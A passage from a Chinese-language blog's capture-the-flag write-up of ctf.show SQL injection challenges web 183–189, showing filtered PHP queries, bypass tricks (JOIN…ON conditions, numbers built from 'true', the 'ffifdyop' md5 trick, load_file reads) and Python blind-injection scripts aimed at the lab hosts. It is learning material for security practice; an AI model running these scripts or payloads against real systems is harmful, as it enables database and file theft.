<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://aba2e256-aa5c-4cf3-849f-b4f6d61fb78d.chall.ctf.show:8080/select-waf.php'</span></span><br><span class="line">Str = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz-}'</span></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tableName'</span>: <span class="string">"`ctfshow_user`where`pass`REGEXP'ctfshow{"</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = {</span><br><span class="line">            <span class="string">'tableName'</span>: data[<span class="string">'tableName'</span>] + i + <span class="string">"'"</span></span><br><span class="line">        }</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">'\$user_count = (\d)'</span>,resp.content.decode())[<span class="number">0</span>] == <span class="string">'1'</span>:</span><br><span class="line">            data[<span class="string">'tableName'</span>] += i</span><br><span class="line">            print(re.findall(<span class="string">'\$user_count = (\d)'</span>,resp.content.decode())[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'}'</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>跑完就得到flag了</p>
<h2 id="web-184"><a href="#web-184" class="headerlink" title="web 184"></a>web 184</h2><p>查询语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = "select count(*) from ".$_POST['tableName'].";";    </span><br></pre></td></tr></table></figure>
<p>返回逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//对传入的参数进行了过滤</span><br><span class="line">  function waf($str){</span><br><span class="line">    return preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);</span><br><span class="line">  }</span><br></pre></td></tr></table></figure>
<p>查询结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br></pre></td></tr></table></figure>
<p>这题连<code>where</code>都过滤掉了, 还剩下一个可以用来设定条件的<code>on</code>, 如果要用<code>on</code>的, 需要用到多表联合查询<code>JOIN</code>, 在两个表(依旧是同一个表)中查询, 生成的临时表中就可以用on</p>
<p>不管是<code>INNER JOIN</code>还是<code>LEFT JOIN</code>或者是<code>RIGHT JOIN</code>都无所谓, 只需要猜flag正确的时候回显不同即可,  因为这题没有过滤掉空格, 构造payload:<code>tableName=ctfshow_user as a inner join ctfshow_user as b on substr(b.pass,num,1)regexp(char(str))</code>, 其中num就是flag的位数, str就是猜测的字符 , 因为知道flag前缀是<code>ctfshow{</code>, 所以从第9位开始猜就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://87deffe2-4291-41ac-b76b-1bcaf046e697.chall.ctf.show:8080/select-waf.php'</span></span><br><span class="line">Str = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz-}'</span></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tableName'</span>: <span class="string">"ctfshow_user as a right join ctfshow_user as b on substr(b.pass,{},1)regexp(char({}))"</span></span><br><span class="line">}</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">flag = <span class="string">'ctfshow{'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = {</span><br><span class="line">            <span class="string">'tableName'</span>: data[<span class="string">'tableName'</span>].<span class="built_in">format</span>(num, <span class="built_in">ord</span>(i))</span><br><span class="line">        }</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">'\$user_count = (\d*)'</span>, resp.content.decode())[<span class="number">0</span>] == <span class="string">'43'</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'}'</span>:</span><br><span class="line">                exit()</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="web-185-186"><a href="#web-185-186" class="headerlink" title="web 185  186"></a>web 185  186</h2><p>在184的基础上过滤掉了数字, 也就是说payload里面不能出现数字, 可以用true+true+true….来构造想要的数字, 如99就是99个true相加, 利用这个继续写脚本得到flag</p>
<p>从Y4博客找到一张图<br><img src="http://47.98.130.190:8090/upload/2021/03/web185-5aed31977bec4fea8a5db59a746da244.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://2f2306e9-b139-4243-b9be-ff87dacd631c.chall.ctf.show:8080/select-waf.php'</span></span><br><span class="line">Str = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz-}'</span></span><br><span class="line">data = {</span><br><span class="line">    <span class="string">'tableName'</span>: <span class="string">"ctfshow_user as a right join ctfshow_user as b on substr(b.pass,{},true)regexp(char({}))"</span></span><br><span class="line">}</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">flag = <span class="string">'ctfshow{'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = {</span><br><span class="line">            <span class="string">'tableName'</span>: data[<span class="string">'tableName'</span>].<span class="built_in">format</span>((num*<span class="string">'true+'</span>)[:-<span class="number">1</span>], (<span class="built_in">ord</span>(i)*<span class="string">'true+'</span>)[:-<span class="number">1</span>])</span><br><span class="line">        }</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">'\$user_count = (\d*)'</span>, resp.content.decode())[<span class="number">0</span>] == <span class="string">'43'</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'}'</span>:</span><br><span class="line">                exit()</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="web-187"><a href="#web-187" class="headerlink" title="web 187"></a>web 187</h2><p>以前做过的<code>md5($password,true)</code> 可以去看看 jarvis oj - login, 一个很神奇的字符串<code>ffifdyop</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">"select count(*) from ctfshow_user where username = <span class="subst">$_POST</span>['username'] and password= md5(<span class="subst">$_POST</span>['password'],true)"</span>; </span><br></pre></td></tr></table></figure>
<p><code>md5('ffifdyop',true) = "'or'6xxxxxxx"</code></p>
<h2 id="web-188"><a href="#web-188" class="headerlink" title="web 188"></a>web 188</h2><p>先pass , 有点奇怪</p>
<h2 id="web-189"><a href="#web-189" class="headerlink" title="web 189"></a>web 189</h2><p>查询语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"select pass from ctfshow_user where username = <span class="subst">{$username}</span>"</span>;</span><br></pre></td></tr></table></figure>
<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i'</span>, <span class="variable">$username</span>)){</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">'msg'</span>]=<span class="string">'用户名非法'</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$password</span>)){</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">'msg'</span>]=<span class="string">'密码只能为数字'</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">'pass'</span>]==<span class="variable">$password</span>){</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">'msg'</span>]=<span class="string">'登陆成功'</span>;</span><br><span class="line">  }</span><br></pre></td></tr></table></figure>
<p>hint: flag在api/index.php文件中</p>
<p>学习到了一些sql注入可能用到的函数:</p>
<ol>
<li><code>if(exp1,exp2,exp3)</code>, 当<code>exp1</code>为<code>TRUE</code>时函数返回<code>exp2</code>, 反之返回<code>exp3</code>, 可搭配一些字符串比较函数来进行<strong>盲注</strong></li>
<li><code>load_file(file_name)</code>, 读取一个文件并将其内容作为字符串返回, 用于读取外部文件</li>
<li><code>locate(substr,str)</code>, 返回字符串<code>str</code>第一次出现子串<code>substr</code>的位置</li>
<li><code>strcmp(str1,str2)</code>,如果这两个字符串相等返回0，如果第一个参数是根据当前的排序顺序比第二较小则返回-1，否则返回1</li>
</ol>
<p>hint已经告诉了我们flag在文件index.php中, 要在sql中读取文件, 可以使用<code>load_file()</code>, 所以要在<code>username ={$username}</code>处执行<code>load_file()</code>且判断出flag是啥.</p>
<p>注意到<code>$username</code>没有被引号包着, 所以如果<code>$username</code>是语句是可以执行的.</p>
<p>这里要用<code>if()</code>和一些字符串你处理的函数来对flag进行盲注. </p>
<p>当<code>username=1&amp;password=0</code>时返回的是查询失败而当<code>username=0&amp;password=0</code>时返回的是密码错误, 可以根据这个回显来对flag进行判断.</p>
<p>首先, 先找到flag在文件中的位置, 因为前缀是ctfshow{ ,所以根据这个来找到flag的位置.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findindex</span>():</span></span><br><span class="line">    Index = <span class="number">1</span></span><br><span class="line">    url = <span class="string">'http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/'</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = {</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"if(locate('ctfshow{',"</span> + <span class="string">"load_file('/var/www/html/api/index.php'))&gt;{},0,1)"</span>.<span class="built_in">format</span>(Index),</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'0'</span></span><br><span class="line">        }</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"\\u5bc6\\u7801\\u9519\\u8bef"</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Index + <span class="number">8</span></span><br></pre></td></tr></table></figure>
<p>然后根据上面得到的flag的起始位置开始猜flag, 最终脚本为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/'</span></span><br><span class="line">Str = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz-}'</span></span><br><span class="line">flag = <span class="string">'ctfshow{'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findindex</span>():</span></span><br><span class="line">    Index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = {</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"if(locate('ctfshow{',"</span> + <span class="string">"load_file('/var/www/html/api/index.php'))&gt;{},0,1)"</span>.<span class="built_in">format</span>(Index),</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'0'</span></span><br><span class="line">        }</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"\\u5bc6\\u7801\\u9519\\u8bef"</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Index + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Index = findindex()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        data = {</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"if(strcmp('{}',substr(load_file('/var/www/html/api/index.php'),{},1))=0,0,1)"</span>.<span class="built_in">format</span>(i, Index),</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'0'</span></span><br><span class="line">        }</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"\\u5bc6\\u7801\\u9519\\u8bef"</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            flag += i</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">'}'</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="Previous page" aria-label="Previous page" href="/page/29/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/29/">29</a><span class="page-number current">30</span><a class="page-number" href="/page/31/">31</a><span class="space">&hellip;</span><a class="page-number" href="/page/38/">38</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/31/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">K1rit0</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">350k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">5:18</span>
  </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
